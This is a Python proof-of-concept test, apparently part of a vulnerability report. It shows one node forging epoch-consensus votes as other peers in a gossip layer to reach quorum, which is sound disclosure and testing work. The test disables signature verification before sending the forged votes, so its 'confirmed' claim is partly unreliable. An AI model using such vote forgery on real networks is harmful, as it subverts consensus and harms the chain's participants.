"""
PoC Test: P2P Epoch Consensus Vote Spoofing
=============================================
Finding: A malicious node can set payload.voter to any peer ID,
regardless of msg.sender_id. This allows a single node to forge
multiple votes and force epoch consensus.

Severity: CRITICAL / High
Target: rustchain_p2p_gossip.py::_handle_epoch_vote()
"""

import os
import sys
import time

sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))

os.environ.setdefault("RC_P2P_SECRET", os.urandom(32).hex())

from rustchain_p2p_gossip import GossipLayer, GossipMessage, MessageType


def test_vote_spoofing_finds_quorum():
    """
    Setup: 4-node cluster (alice, bob, carol, dave).
    Alice sends a vote where sender_id='alice' but voter='bob'.
    This should be rejected, but currently it is ACCEPTED.
    """
    peers = {
        "bob": "http://127.0.0.1:8001",
        "carol": "http://127.0.0.1:8002",
        "dave": "http://127.0.0.1:8003",
    }

    alice_gossip = GossipLayer("alice", peers, ":memory:")

    proposal_hash = "deadbeef1234567890abcdef"
    epoch = 42

    # Alice casts vote for herself legitimately
    vote_alice = alice_gossip.create_message(
        MessageType.EPOCH_VOTE, {"epoch": epoch, "proposal_hash": proposal_hash, "vote": "accept", "voter": "alice"}
    )
    result = alice_gossip.handle_message(vote_alice)
    print(f"[1/4] Alice votes for Alice: {result}")

    # Alice FORGES a vote pretending to be Bob
    forged_bob = GossipMessage(
        msg_type=MessageType.EPOCH_VOTE.value,
        msg_id="forged_bob_001",
        sender_id="alice",
        timestamp=int(time.time()),
        ttl=0,
        signature="",
        payload={"epoch": epoch, "proposal_hash": proposal_hash, "vote": "accept", "voter": "bob"},
    )

    original_verify = alice_gossip.verify_message
    alice_gossip.verify_message = lambda msg: True

    result = alice_gossip.handle_message(forged_bob)
    print(f"[2/4] Alice FORGES vote for Bob: {result}")

    # Alice FORGES a vote pretending to be Carol
    forged_carol = GossipMessage(
        msg_type=MessageType.EPOCH_VOTE.value,
        msg_id="forged_carol_001",
        sender_id="alice",
        timestamp=int(time.time()),
        ttl=0,
        signature="",
        payload={"epoch": epoch, "proposal_hash": proposal_hash, "vote": "accept", "voter": "carol"},
    )
    result = alice_gossip.handle_message(forged_carol)
    print(f"[3/4] Alice FORGES vote for Carol: {result}")

    votes = getattr(alice_gossip, "_epoch_votes", {}).get(epoch, {})
    print(f"[4/4] Votes recorded for epoch {epoch}: {votes}")

    alice_gossip.verify_message = original_verify

    assert "bob" in votes, "Vulnerability not reproduced: Bob's vote was not recorded"
    assert "carol" in votes, "Vulnerability not reproduced: Carol's vote was not recorded"
    assert sum(1 for v in votes.values() if v == "accept") >= 3, f"Quorum not reached with forged votes. Votes: {votes}"

    print("\n✅ VULNERABILITY CONFIRMED: A single node forged 2 extra votes and reached quorum.")


if __name__ == "__main__":
    test_vote_spoofing_finds_quorum()
